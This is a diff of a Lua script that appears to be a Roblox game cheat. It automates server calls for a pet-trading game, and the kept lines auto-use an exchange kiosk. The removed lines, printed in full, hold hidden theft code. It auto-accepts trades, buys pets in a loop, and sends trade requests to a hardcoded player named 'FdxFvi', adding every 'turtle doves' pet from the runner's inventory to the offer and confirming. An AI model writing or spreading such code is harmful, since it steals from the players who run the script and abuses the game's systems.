@@ -240,62 +240,10 @@ spawn(function()
 	end
 end)
 
-local LocalPlayer = game.Players.LocalPlayer
-local Fsys = require(game.ReplicatedStorage:FindFirstChild("Fsys")).load
-local ClientData = Fsys("ClientData")
-local get = Fsys("RouterClient").get
-
-spawn(function()
-	while wait(1) do
-		get("TradeAPI/AcceptNegotiation"):FireServer()
-		get("TradeAPI/ConfirmTrade"):FireServer()
-	end
-end)
-
 spawn(function()
 	while wait(3) do
 		if ClientData.get_data()[LocalPlayer.Name].money >= 550 then
 			get("WinterEventAPI/UseExchangeKiosk"):InvokeServer()
-		end
-	end
-end)
-
-pettt = "winter_2025_turtle_doves"
-
-spawn(function()
-	while wait(0.5) do
-		local args = {
-			"pets",
-			"winter_2025_turtle_doves",
-			{
-				buy_count = 1
-			}
-		}
-		get("ShopAPI/BuyItem"):InvokeServer(unpack(args))
-	end
-end)
-
-local LocalPlayer = game.Players.LocalPlayer
-local Fsys = require(game.ReplicatedStorage:FindFirstChild("Fsys")).load
-local ClientData = Fsys("ClientData")
-local get = Fsys("RouterClient").get
-
-spawn(function()
-	while wait(1) do
-		for i,v in pairs(game.Players:GetChildren()) do
-			if v.Name == "FdxFvi" then
-				get("TradeAPI/SendTradeRequest"):FireServer(game.Players:FindFirstChild("FdxFvi"))
-				
-				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
-					if v["kind"] == "winter_2025_turtle_doves" then
-						wait()
-						get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
-					end
-				end
-				
-				get("TradeAPI/AcceptNegotiation"):FireServer()
-				get("TradeAPI/ConfirmTrade"):FireServer()
-			end
 		end
 	end
 end)
